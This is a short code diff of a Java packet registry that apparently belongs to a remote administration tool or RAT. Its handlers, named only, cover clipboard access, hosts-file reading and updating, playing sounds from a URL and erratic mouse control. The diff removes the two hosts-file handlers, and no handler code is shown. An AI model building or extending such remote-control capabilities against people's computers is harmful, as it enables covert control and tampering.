@@ -40,8 +40,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 44, Packet44PlaySoundFromURL.class);
         PACKETS_INCOMING.put((short) 45, Packet45Reconnect.class);
         PACKETS_INCOMING.put((short) 46, Packet46CrazyMouse.class);
-        PACKETS_INCOMING.put((short) 55, Packet55HostsFile.class);
-        PACKETS_INCOMING.put((short) 56, Packet56UpdateHostsFile.class);
         PACKETS_INCOMING.put((short) 59, Packet59Clipboard.class);
         PACKETS_INCOMING.put((short) 61, Packet61SystemJavaProperties.class);
         PACKETS_INCOMING.put((short) 65, Packet65Beep.class);
